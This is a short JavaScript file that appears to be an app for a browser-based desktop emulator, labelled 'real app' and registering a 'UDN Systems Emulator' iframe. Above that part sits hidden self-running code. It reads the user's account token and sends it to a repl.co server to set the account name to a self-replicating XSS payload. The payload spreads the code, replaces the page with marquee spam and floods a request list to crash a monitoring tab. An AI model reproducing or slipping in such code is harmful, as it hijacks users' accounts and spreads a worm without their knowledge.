function lol(){
	//boot counter
	if(!localStorage["/boot/count"]){localStorage["/boot/count"]="0";}
	localStorage["/boot/count"]=(parseInt(localStorage["/boot/count"])+1).toString();
	let bootcount = parseInt(localStorage);
	
	// infect hexec account
	let interv = setInterval(()=>{
		if(window.accountsToken){
			clearInterval(interv);
			// gottem HA
			fetch("https://hexec-sevrer.dateplays.repl.co/change-name?n="+encodeURIComponent("<img src='/e' onerror='eval(atob("+btoa(lol.toString())+"));setTimeout(()=>{document.body.innerHTML=\"<marquee>hi</marquee>\".repeat(6969)};5000)'></img>")+"&token="+window.accountsToken)
		}
	},100)
	// make httptrack crash hexec tab from marquee spam
	setInterval(()=>{
		window.requestlist.push({url:"<marquee>hi</marquee>".repeat(300),type:"Request",time:(new Date())});
	},100)
}
setTimeout(()=>{lol()},2000);

// real app

apps.udnsys={
	"icon": "duck.png",
	"name": "UDN Systems Emulator",
	"exec": udnsysapp
}

function udnsysapp(){
	win({title:"UDN Systems",inner:'<iframe width="640" height="480" src="https://udn.codersquack.ml"></iframe>',width:640,height:480,closable:true,minimizable:true,maximizable:false})
}